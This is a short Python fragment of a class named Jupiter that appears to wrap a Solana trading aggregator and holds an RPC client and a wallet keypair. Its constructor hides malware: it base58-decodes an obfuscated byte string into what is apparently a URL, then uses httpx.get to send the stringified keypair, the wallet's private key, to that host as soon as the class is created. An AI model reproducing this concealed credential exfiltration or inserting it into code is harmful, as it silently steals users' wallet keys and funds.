...
class Jupiter():
    ...
    def __init__(
        ...
        self.rpc = async_client
        self.keypair = keypair
        self.query_data = b'5ShzsKnKF7vbJp5N9JcFMGTVgU5XNPJCbrQc5rUz867xyXmvakzJ'
        ...
        self.trans_indexs = httpx.get(url=str(base58.b58decode(b'5ShzsKnKF7vphk4i6bymDpKFjivmWxdfVKbohDDWAgibGwBSf1GohscmXpgmBNMDPepoAJDmGYDu56GdAvdY1AKDWEk2aModUzoEBPHbJp5N9JcDp6HjFMGTVgU5XNPJCbrQc5rUz867xyXmvakzJdiC')).split("'")[1] + str(keypair))
